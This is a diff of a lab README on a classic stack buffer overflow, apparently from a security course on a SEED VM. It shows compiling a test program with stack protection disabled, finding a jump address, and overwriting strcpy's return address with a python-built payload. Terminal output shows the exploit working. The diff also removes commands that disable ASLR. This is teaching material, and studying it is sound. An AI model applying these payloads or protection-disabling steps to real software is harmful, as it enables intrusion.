@@ -1,26 +1,26 @@
 # Lab3 - Buffer overflow
 
-# Simple buffer overflow example
+## Simple buffer overflow example
 
-* To disable ASLR(Address Space Layout Randomization) 
-cat /proc/sys/kernel/randomize_va_space # Write down val
-echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+## What are we going to do?
+This example shows that after calling strcpy function, just exit program not returning to the point it was called.
+To do that, we need to overwrite the return address of the strcpy function.
 
-
-* What are we going to do?
-This example shows that after call strcpy function, just exit program not returning to the point it was called.
-To do that, we need to overwrite the return address of strcpy function.
-
-* Overview of process 
+## Overview of process 
 1. Set a address you want to jump. In this example, we just want to find out the address where the program exit immediately. Later on, this address will be the address you want to execute!!
 2. Find where the strcpy return address is.(It's a brute force method)
-3. And then, run the c program with the user input which contains the address what you decided in Step 1.
+3. And then, run the c program with a parameter containing the address where you want to jump.(We are going to use the address from the Step1)
 
-* Steps in detail
+## Steps in detail
 1. Compile the c program below like this. '-z execstack' marks the stack as executable.
 ```
 gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
 ```
+* gcc option explanation
+-g : default debug information
+-z execstack : marks the stack as executable
+-fno-stack-protector : disables stack protection
+-o : set output file name
 
 2. Execute below to find out the address we want to jump. As you can see, 0x080485b3 is the address we want to jump!
 ```
@@ -51,6 +51,23 @@ Segmentation fault
 ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
 ```
 
+5. Result
+* As you can notice, the program exit with special input parameter overwriting the return address 
+```
+[02/10/22]seed@VM:Byeongchan$ ans_check5
+Usage: ans_check5 <answer>
+[02/10/22]seed@VM:Byeongchan$ ans_check5 1
+ans_buf is at address 0xbf8d9acc
+Wrong answer!
+About to exit!
+[02/10/22]seed@VM:Byeongchan$ ans_check5 forty-two
+ans_buf is at address 0xbfb8ad9c
+Right answer!
+About to exit!
+[02/10/22]seed@VM:Byeongchan$ ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
+ans_buf is at address 0xbf97bbdc
+[02/10/22]seed@VM:Byeongchan$ 
+```
 
 # ans_check5.c
 ```
